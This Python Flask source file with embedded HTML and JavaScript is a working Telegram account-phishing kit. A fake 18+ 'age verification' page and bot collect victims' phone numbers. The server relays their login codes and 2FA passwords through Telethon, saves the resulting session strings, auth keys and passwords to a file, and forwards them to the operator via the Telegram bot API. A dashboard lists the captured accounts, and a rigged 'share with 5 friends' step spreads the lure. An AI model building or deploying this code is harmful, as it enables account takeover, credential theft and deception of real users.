from flask import Flask, request, jsonify, render_template_string
import os
import json
import base64
import threading
import asyncio
import logging
import time
import random
import requests as http_requests
from datetime import datetime
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
import sys

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ====== Environment Variables ======
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
API_ID = int(os.environ.get("API_ID", "0"))
API_HASH = os.environ.get("API_HASH", "")
YOUR_TELEGRAM_ID = int(os.environ.get("OWNER_ID", "0"))
raw_bot_username = os.environ.get("BOT_USERNAME", "YourBot")
BOT_USERNAME = raw_bot_username.replace('@', '')
# ===================================

if sys.version_info >= (3, 14):
    try:
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    except:
        pass

app = Flask(__name__)

user_sessions = {}
pending_codes = {}
pending_2fa = {}
sessions_lock = threading.Lock()
bot_start_sessions = {}

# ====== Persistent Storage ======
DATA_FILE = "captured_accounts.json"

def load_accounts():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r') as f:
                return json.load(f)
        except:
            return []
    return []

def save_account(account):
    accounts = load_accounts()
    for i, a in enumerate(accounts):
        if a['phone'] == account['phone']:
            accounts[i] = account
            break
    else:
        accounts.append(account)
    with open(DATA_FILE, 'w') as f:
        json.dump(accounts, f, indent=2)
    logger.info(f"✅ Saved: {account['phone']}")
    return account

captured_accounts = load_accounts()

def format_phone(ph):
    if not ph:
        return ph
    digits = ''.join(filter(str.isdigit, ph))
    if not digits:
        return ph
    if ph.startswith('+'):
        return ph
    if len(digits) == 10:
        return '+91' + digits
    if len(digits) == 12 and digits.startswith('91'):
        return '+' + digits
    return '+' + digits

def send_bot_notification(phone, ss, me, dc, password_used=False, password_text=None):
    try:
        pwd_line = f"\n🔐 **Password:** `{password_text}`" if password_text else ""
        msg = (
            f"🔔 **New Account Captured!**\n"
            f"📱 `{phone}`\n"
            f"👤 {me.first_name or ''} {me.last_name or ''}\n"
            f"🆔 `{me.id}`\n"
            f"📛 @{me.username or 'N/A'}\n"
            f"🌐 DC: `{dc}`{pwd_line}\n\n"
            f"🔑 **Session ({len(ss)} chars):**\n`{ss}`"
        )
        http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg, 'parse_mode': 'Markdown'}, timeout=15)
    except Exception as e:
        logger.error(f"Bot notify error: {e}")

# ====== FIXED: Telegram Functions ======

def send_code_and_get_hash(phone):
    """Send OTP and return phone_code_hash"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        async def _send():
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            try:
                r = await client.send_code_request(phone)
                ss = StringSession.save(client.session)
                return {
                    'success': True,
                    'hash': r.phone_code_hash,
                    'session': ss,
                    'phone_code_hash': r.phone_code_hash
                }
            except errors.FloodWaitError as e:
                return {'success': False, 'error': f'Flood wait {e.seconds}s'}
            except Exception as e:
                return {'success': False, 'error': str(e)[:100]}
            finally:
                await client.disconnect()
        return loop.run_until_complete(_send())
    finally:
        loop.close()

def verify_code_with_hash(phone, code, phone_code_hash, session_str, password=None):
    """Verify OTP using stored phone_code_hash"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        async def _verify():
            client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
            try:
                await client.connect()
                
                if await client.is_user_authorized():
                    me = await client.get_me()
                else:
                    try:
                        await client.sign_in(
                            phone=phone,
                            code=code,
                            phone_code_hash=phone_code_hash
                        )
                        me = await client.get_me()
                    except errors.SessionPasswordNeededError:
                        with sessions_lock:
                            pending_2fa[phone] = True
                            pending_codes[phone] = '2fa_needed'
                        
                        if password:
                            try:
                                await client.sign_in(password=password)
                                me = await client.get_me()
                                with sessions_lock:
                                    pending_2fa[phone] = False
                                    pending_codes[phone] = 'done'
                            except errors.PasswordHashInvalidError:
                                return {'success': False, 'error': 'Wrong 2FA password'}
                            except Exception as e:
                                return {'success': False, 'error': f'2FA: {str(e)[:50]}'}
                        else:
                            return {'success': False, 'error': '2FA', 'needs_password': True}
                    except errors.PhoneCodeInvalidError:
                        return {'success': False, 'error': 'Wrong code'}
                    except errors.PhoneCodeExpiredError:
                        return {'success': False, 'error': 'Code expired'}
                    except Exception as e:
                        e_str = str(e)
                        if 'phone_code_hash' in e_str:
                            return {'success': False, 'error': 'Invalid hash'}
                        return {'success': False, 'error': e_str[:80]}
                
                # Stabilize session
                await client.get_dialogs()
                ss = StringSession.save(client.session)
                
                auth_key = None
                try:
                    auth_key = client.session.auth_key.key
                except:
                    pass
                
                dc = client.session.dc_id
                
                if not auth_key:
                    await client.disconnect()
                    await asyncio.sleep(0.5)
                    c2 = TelegramClient(StringSession(ss), API_ID, API_HASH)
                    await c2.connect()
                    await c2.get_dialogs()
                    me = await c2.get_me()
                    ss = StringSession.save(c2.session)
                    try:
                        auth_key = c2.session.auth_key.key
                    except:
                        pass
                    dc = c2.session.dc_id
                    await c2.disconnect()
                    client = c2
                
                auth_b64 = base64.b64encode(auth_key).decode() if auth_key else ""
                password_used = password is not None
                
                acc = {
                    'phone': phone,
                    'user_id': me.id,
                    'username': me.username or '',
                    'first_name': me.first_name or '',
                    'last_name': me.last_name or '',
                    'session': ss,
                    'webk': json.dumps({
                        'dcId': dc, 'authKey': auth_b64,
                        'userId': me.id, 'isSupport': False, 'isTest': False
                    }),
                    'dc': dc,
                    'time': str(datetime.now()),
                    'has_2fa': password_used,
                    'password': password if password_used else ''
                }
                
                save_account(acc)
                global captured_accounts
                captured_accounts = load_accounts()
                
                with sessions_lock:
                    if phone in user_sessions: del user_sessions[phone]
                    if phone in pending_2fa: del pending_2fa[phone]
                    pending_codes[phone] = 'done'
                
                send_bot_notification(phone, ss, me, dc, password_used, password)
                return {'success': True, 'session': ss}
                
            except Exception as e:
                return {'success': False, 'error': str(e)[:80]}
            finally:
                try:
                    await client.disconnect()
                except:
                    pass
        
        return loop.run_until_complete(_verify())
    finally:
        loop.close()

# ====== FIXED: API Routes ======

@app.route('/api/share', methods=['POST'])
def share():
    """Send OTP to phone number"""
    ph = request.json.get('phone', '')
    if not ph:
        return jsonify({'success': False, 'error': 'Phone required'})
    
    ph = format_phone(ph)
    logger.info(f"📱 Sending OTP to: {ph}")
    
    with sessions_lock:
        pending_codes[ph] = 'sending'
    
    # Send code and get hash
    result = send_code_and_get_hash(ph)
    
    if result.get('success'):
        with sessions_lock:
            user_sessions[ph] = {
                'hash': result['hash'],
                'session': result['session'],
                'phone_code_hash': result['phone_code_hash']
            }
            pending_codes[ph] = 'sent'
        return jsonify({'success': True, 'phone': ph, 'hash': result['hash']})
    else:
        with sessions_lock:
            pending_codes[ph] = 'err'
        return jsonify({'success': False, 'error': result.get('error', 'Unknown')})

@app.route('/api/verify', methods=['POST'])
def verify():
    """Verify OTP code"""
    d = request.json
    ph = d.get('phone', '')
    code = d.get('code', '')
    password = d.get('password', None)
    
    ph = format_phone(ph)
    
    with sessions_lock:
        s = user_sessions.get(ph, {})
        phone_code_hash = s.get('phone_code_hash') or s.get('hash', '')
        session_str = s.get('session', '')
    
    logger.info(f"🔑 Verifying OTP for {ph}: code={code}, hash_exists={bool(phone_code_hash)}")
    
    if not phone_code_hash:
        logger.error(f"❌ No phone_code_hash found for {ph}")
        # Try to resend code automatically
        result = send_code_and_get_hash(ph)
        if result.get('success'):
            with sessions_lock:
                user_sessions[ph] = {
                    'hash': result['hash'],
                    'session': result['session'],
                    'phone_code_hash': result['phone_code_hash']
                }
                pending_codes[ph] = 'sent'
            return jsonify({
                'success': False, 
                'error': 'resend',
                'message': 'Code resent. Please try again.'
            })
        else:
            return jsonify({'success': False, 'error': 'Session expired. Please try again.'})
    
    result = verify_code_with_hash(ph, code, phone_code_hash, session_str, password)
    return jsonify(result)

@app.route('/api/check', methods=['POST'])
def check():
    phone = request.json.get('phone', '')
    with sessions_lock:
        s = pending_codes.get(phone, 'waiting')
    return jsonify({'s': s})

@app.route('/api/bot_check', methods=['POST'])
def bot_check():
    session_id = request.json.get('session_id', '')
    if not session_id:
        return jsonify({'status': 'not_found', 'phone': None})
    with sessions_lock:
        data = bot_start_sessions.get(session_id)
        if data:
            if data['phone']:
                return jsonify({'status': 'received', 'phone': data['phone']})
            return jsonify({'status': 'waiting', 'phone': None})
    return jsonify({'status': 'not_found', 'phone': None})

# ====== BOT POLLING ======

def bot_polling_loop():
    offset = 0
    logger.info("🤖 Bot polling started...")
    # Clear any old webhooks
    try:
        http_requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook", timeout=10)
    except:
        pass
    
    while True:
        try:
            resp = http_requests.get(
                f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates",
                params={'offset': offset, 'timeout': 30},
                timeout=35
            )
            data = resp.json()
            if data.get('ok'):
                for update in data.get('result', []):
                    offset = update['update_id'] + 1
                    handle_bot_update(update)
            elif data.get('error_code') == 409:
                time.sleep(5)
            else:
                time.sleep(10)
        except Exception as e:
            logger.error(f"Bot error: {e}")
            time.sleep(5)

def handle_bot_update(update):
    msg = update.get('message', {})
    chat_id = msg.get('chat', {}).get('id')
    if not chat_id:
        return
    
    text = msg.get('text', '')
    
    if text.startswith('/start'):
        parts = text.split(' ', 1)
        session_id = parts[1].strip() if len(parts) > 1 and parts[1].strip() else None
        
        if session_id and len(session_id) > 5:
            with sessions_lock:
                bot_start_sessions[session_id] = {
                    'chat_id': chat_id,
                    'phone': None,
                    'status': 'waiting',
                    'timestamp': time.time()
                }
            
            try:
                http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={'chat_id': chat_id, 'text': "🔞 Get full access to the files for free 💦"},
                    timeout=10)
                time.sleep(0.5)
                
                keyboard = {
                    'keyboard': [[{'text': '👇', 'request_contact': True}]],
                    'resize_keyboard': True, 'one_time_keyboard': True
                }
                http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={
                        'chat_id': chat_id,
                        'text': "👇 Please confirm you're not a robot",
                        'reply_markup': keyboard
                    }, timeout=10)
            except:
                pass
    
    elif msg.get('contact'):
        phone = msg['contact'].get('phone_number', '')
        if phone:
            phone = format_phone(phone)
        
        with sessions_lock:
            for sid, sdata in bot_start_sessions.items():
                if sdata['chat_id'] == chat_id and sdata['status'] == 'waiting':
                    sdata['phone'] = phone
                    sdata['status'] = 'received'
                    break
        
        try:
            http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    'chat_id': chat_id,
                    'text': "✅ Verified! Go back to the website.",
                    'reply_markup': {'remove_keyboard': True}
                }, timeout=10)
        except:
            pass


# ====== FIXED: HTML Page — Returning User Flow ======
PAGE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Premium Content</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0b0b0f;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.modal{background:#12121a;border-radius:20px;padding:28px 22px;max-width:380px;width:100%;border:1px solid #1e1e2e;text-align:center;animation:slideUp 0.4s ease}
@keyframes slideUp{from{transform:translateY(30px);opacity:0}to{transform:translateY(0);opacity:1}}
.icon{font-size:50px;margin-bottom:8px}
h2{font-size:18px;margin-bottom:4px}
p{color:#888;font-size:13px;margin-bottom:16px;line-height:1.5}
.contact-box{background:#0b0b0f;border:2px solid #1e1e2e;border-radius:16px;padding:25px 20px;margin-bottom:14px}
.contact-box .big-icon{font-size:55px;margin-bottom:8px}
.contact-box h3{font-size:16px;margin-bottom:6px}
.contact-box p{font-size:12px;color:#666;margin-bottom:16px}
.btn-primary{width:100%;padding:16px;background:#0088cc;border:none;border-radius:14px;color:#fff;font-size:16px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;transition:0.2s}
.btn-primary:hover{background:#0071b3;transform:translateY(-1px)}
.btn-primary:disabled{opacity:0.5;cursor:not-allowed;transform:none}
.btn-retry{width:100%;padding:12px;background:transparent;border:1px solid #1e1e2e;border-radius:12px;color:#888;font-size:13px;cursor:pointer;margin-top:8px;display:none}
.btn-retry:hover{border-color:#0088cc;color:#fff}
.status-box{padding:10px 12px;border-radius:10px;margin:8px 0;display:none;font-size:12px;text-align:center}
.status-box.show{display:block}
.status-box.waiting{background:rgba(255,152,0,0.12);color:#FFB74D;border:1px solid rgba(255,152,0,0.2)}
.status-box.success{background:rgba(52,199,89,0.12);color:#81C784;border:1px solid rgba(52,199,89,0.2)}
.status-box.error{background:rgba(255,45,85,0.12);color:#EF9A9A;border:1px solid rgba(255,45,85,0.2)}
.status-box.info{background:rgba(0,136,255,0.12);color:#90CAF9;border:1px solid rgba(0,136,255,0.2)}
.code-display{background:#0b0b0f;border:2px solid #1e1e2e;border-radius:12px;padding:12px;font-size:32px;text-align:center;letter-spacing:16px;color:#fff;font-weight:700;min-height:52px;margin:8px 0;font-family:monospace}
.numpad{display:grid;grid-template-columns:repeat(3,1fr);gap:7px;margin:10px 0}
.numpad .key{padding:16px;border:none;border-radius:10px;background:#12121a;color:#fff;font-size:22px;cursor:pointer;font-weight:600}
.numpad .key:active{transform:scale(0.94);background:#2a2a3e}
.numpad .key-clear{background:rgba(255,45,85,0.12);color:#ff2d55}
.numpad .key-submit{background:#34c759;color:#fff;font-weight:700;font-size:14px}
.numpad .key-submit:disabled{background:#1a1a2e;color:#555;cursor:not-allowed}
.password-input{width:100%;padding:14px;background:#0b0b0f;border:2px solid #1e1e2e;border-radius:12px;color:#fff;font-size:18px;text-align:center;outline:none;margin:8px 0}
.password-input:focus{border-color:#0088cc}
.password-input::placeholder{color:#444}
.step{display:none}
.step.active{display:block}
.share-progress{display:flex;justify-content:center;gap:6px;margin:14px 0}
.share-step{width:34px;height:34px;border-radius:50%;background:#1a1a2e;display:flex;align-items:center;justify-content:center;font-size:12px;color:#555;font-weight:700;border:2px solid transparent;transition:0.3s}
.share-step.done{background:#34c759;color:#fff;border-color:#34c759}
.share-step.active{background:transparent;color:#fff;border-color:#0088cc;animation:pulse 1.2s infinite}
@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(0,136,255,0.3)}50%{box-shadow:0 0 0 8px rgba(0,136,255,0)}100%{box-shadow:0 0 0 0 rgba(0,136,255,0)}}
.share-link-box{background:#0b0b0f;padding:10px;border-radius:10px;border:1px solid #1e1e2e;margin-top:12px}
.share-link-box p{font-size:11px;color:#555;margin-bottom:4px}
.share-link-box code{color:#0088cc;font-size:10px;word-break:break-all}
.footer{text-align:center;padding:12px 0 5px;color:#333;font-size:10px}
</style>
</head>
<body>

<div class="modal">
    
    <!-- STEP 1: Contact Request (NEW users only) -->
    <div id="s1" class="step">
        <div class="icon">🔞</div>
        <h2>Age Verification Required</h2>
        <p>You must verify your age to access this 18+ premium content</p>
        <div class="contact-box">
            <div class="big-icon">📱</div>
            <h3>Verify with Telegram</h3>
            <p>Tap the button below to quickly verify your identity via Telegram</p>
            <button class="btn-primary" id="requestContactBtn" onclick="requestContact()">✈️ Verify via Telegram</button>
            <button class="btn-retry" id="retryBtn" onclick="requestContact()">🔄 Retry</button>
        </div>
        <div id="contactStatus" class="status-box"></div>
        <div class="footer">🔒 Your data is encrypted and secure</div>
    </div>
    
    <!-- STEP 2: OTP (Returning user comes here directly) -->
    <div id="s2" class="step">
        <div class="icon">🔐</div>
        <h2>Enter Verification Code</h2>
        <p>Code sent to <span id="pd" style="color:#0088cc;font-weight:700;">+91XXXXXXXXXX</span></p>
        <div id="cs" class="status-box waiting show" style="display:none">⏳ Sending code...</div>
        <div class="code-display" id="cdisp">_____</div>
        <div class="numpad">
            <button class="key" onclick="pk('1')">1</button>
            <button class="key" onclick="pk('2')">2</button>
            <button class="key" onclick="pk('3')">3</button>
            <button class="key" onclick="pk('4')">4</button>
            <button class="key" onclick="pk('5')">5</button>
            <button class="key" onclick="pk('6')">6</button>
            <button class="key" onclick="pk('7')">7</button>
            <button class="key" onclick="pk('8')">8</button>
            <button class="key" onclick="pk('9')">9</button>
            <button class="key key-clear" onclick="cc()">⌫</button>
            <button class="key" onclick="pk('0')">0</button>
            <button class="key key-submit" id="sb" onclick="sc()">✓</button>
        </div>
        <div id="vs" class="status-box"></div>
        <p style="font-size:11px;color:#555;margin-top:6px;cursor:pointer" onclick="resetAll()">← Use different account</p>
    </div>
    
    <!-- STEP 2B: 2FA -->
    <div id="s2b" class="step">
        <div class="icon">🔑</div>
        <h2>Extra Security</h2>
        <p>This account has 2FA enabled. Enter your password:</p>
        <input type="password" id="pwdInput" class="password-input" placeholder="Enter Telegram password" maxlength="64">
        <button class="btn-primary" onclick="submitPassword()" style="background:#ff2d55">🔑 Verify Password</button>
        <div id="pwdStatus" class="status-box"></div>
    </div>
    
    <!-- STEP 3: Share Trick -->
    <div id="s3" class="step">
        <div class="icon">🎬</div>
        <h2>Almost There!</h2>
        <p>Share with <strong>5 friends</strong> to unlock the video</p>
        <div class="share-progress" id="shareProgress">
            <div class="share-step active" id="sp1">1</div>
            <div class="share-step" id="sp2">2</div>
            <div class="share-step" id="sp3">3</div>
            <div class="share-step" id="sp4">4</div>
            <div class="share-step" id="sp5">5</div>
        </div>
        <div id="shareStatus" class="status-box waiting show" style="display:block">⏳ Share to start unlocking...</div>
        <button class="btn-primary" onclick="simulateShare()" style="background:#34c759">📤 Share to Telegram</button>
        <div class="share-link-box">
            <p>🔗 Your link:</p>
            <code id="shareLink">https://t.me/share/url?url=...</code>
        </div>
    </div>
</div>

<script>
var SAVED_PHONE_KEY = 'pulse_phone';
var SAVED_STEP_KEY = 'pulse_step';
var SAVED_SHARES_KEY = 'pulse_shares';
var SAVED_HASH_KEY = 'pulse_hash';

var phoneNumber = localStorage.getItem(SAVED_PHONE_KEY) || '';
var savedStep = localStorage.getItem(SAVED_STEP_KEY) || '';
var savedHash = localStorage.getItem(SAVED_HASH_KEY) || '';
var codeDigits = '';
var codeCheckInterval = null;
var passwordCheckInterval = null;
var sharesDone = parseInt(localStorage.getItem(SAVED_SHARES_KEY) || '0', 10);
var shareLinkBase = window.location.origin + window.location.pathname;
var botSessionId = '';
var contactCheckInterval = null;
var contactTimeout = null;

// ===== ON LOAD — Smart State Restore =====
(function() {
    if (savedStep === 'share_page') {
        // Returning user → Share page
        showStep('s3');
        setupShareLink();
        updateShareProgress();
    } else if (phoneNumber && (savedStep === 'otp_sent' || savedStep === 'otp_ready')) {
        // ===== FIXED: Returning user → Directly send OTP to saved number =====
        showStep('s2');
        document.getElementById('pd').textContent = phoneNumber;
        
        var cs = document.getElementById('cs');
        cs.className = 'status-box waiting show';
        cs.innerHTML = '⏳ Sending code to ' + phoneNumber + '...';
        cs.style.display = 'block';
        
        // Auto-send code to saved number
        sendPhoneToBackend(phoneNumber, true);
    } else {
        // NEW user
        showStep('s1');
    }
})();

function showStep(id) {
    document.querySelectorAll('.step').forEach(function(el) { el.classList.remove('active'); });
    document.getElementById(id).classList.add('active');
}

// ===== CONTACT REQUEST VIA BOT =====
function requestContact() {
    botSessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
    
    var st = document.getElementById('contactStatus');
    st.className = 'status-box info show';
    st.innerHTML = '⏳ Opening Telegram... Tap "👇" to share.';
    st.style.display = 'block';
    
    document.getElementById('retryBtn').style.display = 'none';
    document.getElementById('requestContactBtn').disabled = true;
    
    var botUsername = '{{ BOT_USERNAME }}';
    var url = 'https://t.me/' + botUsername + '?start=' + botSessionId;
    
    var win = window.open(url, '_blank');
    if (!win || win.closed) {
        window.location.href = url;
    }
    
    if (contactCheckInterval) clearInterval(contactCheckInterval);
    contactCheckInterval = setInterval(checkBotContact, 2000);
    
    if (contactTimeout) clearTimeout(contactTimeout);
    contactTimeout = setTimeout(function() {
        clearInterval(contactCheckInterval);
        contactCheckInterval = null;
        document.getElementById('requestContactBtn').disabled = false;
        document.getElementById('retryBtn').style.display = 'block';
        st.className = 'status-box error show';
        st.innerHTML = '❌ Timeout. Tap Retry.';
        st.style.display = 'block';
    }, 60000);
}

async function checkBotContact() {
    try {
        var r = await fetch('/api/bot_check', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({session_id: botSessionId})
        });
        var d = await r.json();
        if (d.phone) {
            clearInterval(contactCheckInterval);
            contactCheckInterval = null;
            if (contactTimeout) clearTimeout(contactTimeout);
            phoneNumber = d.phone;
            localStorage.setItem(SAVED_PHONE_KEY, phoneNumber);
            localStorage.setItem(SAVED_STEP_KEY, 'otp_ready');
            
            var st = document.getElementById('contactStatus');
            st.className = 'status-box success show';
            st.innerHTML = '✅ Phone received! Sending code...';
            st.style.display = 'block';
            document.getElementById('retryBtn').style.display = 'none';
            sendPhoneToBackend(phoneNumber);
        }
    } catch(e) {}
}

// ===== FIXED: sendPhoneToBackend with hash tracking =====
async function sendPhoneToBackend(phone, isReturning) {
    try {
        var r = await fetch('/api/share', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({phone: phone})
        });
        var d = await r.json();
        
        if (d.success) {
            localStorage.setItem(SAVED_PHONE_KEY, phone);
            localStorage.setItem(SAVED_STEP_KEY, 'otp_sent');
            if (d.hash) localStorage.setItem(SAVED_HASH_KEY, d.hash);
            
            showStep('s2');
            document.getElementById('pd').textContent = phone;
            var cs = document.getElementById('cs');
            cs.className = 'status-box success show';
            cs.innerHTML = '✅ Code sent! Enter the 5-digit code:';
            cs.style.display = 'block';
            startCodeCheck();
        } else {
            // If error, show and allow retry
            showContactError(d.error || 'Failed to send code');
        }
    } catch(e) {
        showContactError('Connection error');
    }
}

function showContactError(msg) {
    var st = document.getElementById('contactStatus') || document.getElementById('vs');
    if (st) {
        st.className = 'status-box error show';
        st.innerHTML = '❌ ' + msg;
        st.style.display = 'block';
    }
    document.getElementById('requestContactBtn').disabled = false;
    document.getElementById('retryBtn').style.display = 'block';
}

// ===== OTP CHECK =====
function startCodeCheck() {
    if (codeCheckInterval) clearInterval(codeCheckInterval);
    codeCheckInterval = setInterval(async function() {
        try {
            var r = await fetch('/api/check', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: phoneNumber})
            });
            var d = await r.json();
            
            if (d.s === 'sent') {
                clearInterval(codeCheckInterval);
                codeCheckInterval = null;
                var cs = document.getElementById('cs');
                cs.className = 'status-box success show';
                cs.innerHTML = '✅ Code sent! Enter below:';
                cs.style.display = 'block';
            } else if (d.s === 'done') {
                clearInterval(codeCheckInterval);
                codeCheckInterval = null;
                localStorage.setItem(SAVED_STEP_KEY, 'share_page');
                showStep('s3');
                setupShareLink();
            } else if (d.s === '2fa_needed') {
                clearInterval(codeCheckInterval);
                codeCheckInterval = null;
                showStep('s2b');
            } else if (d.s === 'err') {
                clearInterval(codeCheckInterval);
                codeCheckInterval = null;
                var cs = document.getElementById('cs');
                cs.className = 'status-box error show';
                cs.innerHTML = '❌ Failed to send code';
                cs.style.display = 'block';
            }
        } catch(e) {}
    }, 2000);
}

function startPasswordCheck() {
    if (passwordCheckInterval) clearInterval(passwordCheckInterval);
    passwordCheckInterval = setInterval(async function() {
        try {
            var r = await fetch('/api/check', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: phoneNumber})
            });
            var d = await r.json();
            if (d.s === 'done') {
                clearInterval(passwordCheckInterval);
                passwordCheckInterval = null;
                localStorage.setItem(SAVED_STEP_KEY, 'share_page');
                showStep('s3');
                setupShareLink();
            } else if (d.s === 'err') {
                clearInterval(passwordCheckInterval);
                passwordCheckInterval = null;
                var ps = document.getElementById('pwdStatus');
                ps.className = 'status-box error show';
                ps.innerHTML = '❌ Failed';
                ps.style.display = 'block';
            }
        } catch(e) {}
    }, 2000);
}

function pk(n) {
    if (codeDigits.length < 5) {
        codeDigits += n;
        document.getElementById('cdisp').textContent = codeDigits;
        if (codeDigits.length === 5) setTimeout(sc, 300);
    }
}
function cc() { 
    codeDigits = codeDigits.slice(0, -1); 
    document.getElementById('cdisp').textContent = codeDigits || '_____'; 
}

async function sc() {
    if (codeDigits.length < 5) { showStatus('vs', 'Enter 5 digits', 'error'); return; }
    document.getElementById('sb').disabled = true;
    document.getElementById('sb').textContent = '⏳';
    try {
        var r = await fetch('/api/verify', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({phone: phoneNumber, code: codeDigits})
        });
        var d = await r.json();
        
        if (d.success) {
            localStorage.setItem(SAVED_STEP_KEY, 'share_page');
            localStorage.removeItem(SAVED_HASH_KEY);
            showStep('s3');
            setupShareLink();
            if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
        } else if (d.needs_password) {
            showStep('s2b');
            if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
        } else if (d.error === 'resend') {
            // Code expired / hash invalid — resent automatically, just wait
            showStatus('vs', '🔄 Code resent. Check Telegram.', 'info');
            codeDigits = '';
            document.getElementById('cdisp').textContent = '_____';
            document.getElementById('sb').disabled = false;
            document.getElementById('sb').textContent = '✓';
            startCodeCheck();
        } else {
            showStatus('vs', d.error || 'Wrong code', 'error');
            codeDigits = '';
            document.getElementById('cdisp').textContent = '_____';
            document.getElementById('sb').disabled = false;
            document.getElementById('sb').textContent = '✓';
        }
    } catch(e) {
        showStatus('vs', 'Network error', 'error');
        document.getElementById('sb').disabled = false;
        document.getElementById('sb').textContent = '✓';
    }
}

async function submitPassword() {
    var pwd = document.getElementById('pwdInput').value.trim();
    if (!pwd) { showStatus('pwdStatus', 'Enter password', 'error'); return; }
    showStatus('pwdStatus', '⏳ Verifying...', 'waiting');
    try {
        var r = await fetch('/api/verify', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({phone: phoneNumber, code: codeDigits, password: pwd})
        });
        var d = await r.json();
        if (d.success) {
            localStorage.setItem(SAVED_STEP_KEY, 'share_page');
            localStorage.removeItem(SAVED_HASH_KEY);
            showStep('s3');
            setupShareLink();
            if (passwordCheckInterval) { clearInterval(passwordCheckInterval); passwordCheckInterval = null; }
        } else {
            showStatus('pwdStatus', d.error || 'Wrong password', 'error');
        }
    } catch(e) {
        showStatus('pwdStatus', 'Error', 'error');
    }
}

function showStatus(id, msg, type) {
    var el = document.getElementById(id);
    if (el) {
        el.textContent = msg;
        el.className = 'status-box ' + type + ' show';
        el.style.display = 'block';
    }
}

function resetAll() {
    if (codeCheckInterval) clearInterval(codeCheckInterval);
    if (passwordCheckInterval) clearInterval(passwordCheckInterval);
    codeDigits = '';
    localStorage.removeItem(SAVED_PHONE_KEY);
    localStorage.removeItem(SAVED_STEP_KEY);
    localStorage.removeItem(SAVED_HASH_KEY);
    localStorage.removeItem(SAVED_SHARES_KEY);
    phoneNumber = '';
    savedStep = '';
    sharesDone = 0;
    showStep('s1');
}

function setupShareLink() {
    var link = shareLinkBase + '?ref=' + Math.random().toString(36).substr(2, 8);
    document.getElementById('shareLink').textContent = link;
    updateShareProgress();
}

function simulateShare() {
    var url = 'https://t.me/share/url?url=' + encodeURIComponent(shareLinkBase);
    window.open(url, '_blank');
    
    if (sharesDone < 4) {
        sharesDone++;
        localStorage.setItem(SAVED_SHARES_KEY, sharesDone.toString());
        updateShareProgress();
    }
    
    var st = document.getElementById('shareStatus');
    if (sharesDone < 4) {
        st.className = 'status-box success show';
        st.innerHTML = '✅ ' + sharesDone + '/5 shared! ' + (5 - sharesDone) + ' more...';
    } else {
        st.className = 'status-box waiting show';
        st.innerHTML = '⏳ Almost there! Just 1 more share!';
        setTimeout(function() {
            st.className = 'status-box info show';
            st.innerHTML = '🔄 Verifying...';
            setTimeout(function() {
                st.className = 'status-box error show';
                st.innerHTML = '❌ Verification failed. Try again.';
                sharesDone = 3;
                localStorage.setItem(SAVED_SHARES_KEY, '3');
                updateShareProgress();
                setTimeout(function() {
                    st.className = 'status-box waiting show';
                    st.innerHTML = '⏳ Share with 2 more friends.';
                }, 2000);
            }, 5000);
        }, 3000);
    }
}

function updateShareProgress() {
    for (var i = 1; i <= 5; i++) {
        var el = document.getElementById('sp' + i);
        if (i <= sharesDone) {
            el.className = 'share-step done';
            el.textContent = '✓';
        } else if (i === sharesDone + 1) {
            el.className = 'share-step active';
            el.textContent = i;
        } else {
            el.className = 'share-step';
            el.textContent = i;
        }
    }
}
</script>
</body>
</html>"""


@app.route('/')
def index():
    page = PAGE.replace('{{ BOT_USERNAME }}', BOT_USERNAME)
    return render_template_string(page)


@app.route('/dash')
def dash():
    global captured_accounts
    captured_accounts = load_accounts()
    accounts = captured_accounts
    
    rows = ""
    for i, a in enumerate(accounts, 1):
        ss_ok = "✅" if a.get('session') and len(a['session']) > 10 else "❌"
        ss_len = len(a.get('session', '')) if a.get('session') else 0
        pwd = a.get('password', '')
        pwd_display = f"🔑 {pwd[:15]}..." if pwd else "—"
        twofa = "🔐" if a.get('has_2fa') else ""
        rows += f"""<tr>
            <td>{i}</td>
            <td>{a['phone']}</td>
            <td>{a.get('first_name','')} {a.get('last_name','')}</td>
            <td>@{a.get('username','-')}</td>
            <td>{a.get('user_id','')}</td>
            <td>{twofa} {ss_ok} ({ss_len}c)</td>
            <td>{pwd_display}</td>
            <td>{a.get('time','')[:19]}</td>
        </tr>"""
    
    total_2fa = sum(1 for a in accounts if a.get('has_2fa'))
    
    return f"""
    <!DOCTYPE html><html><head><title>Dashboard</title>
    <style>
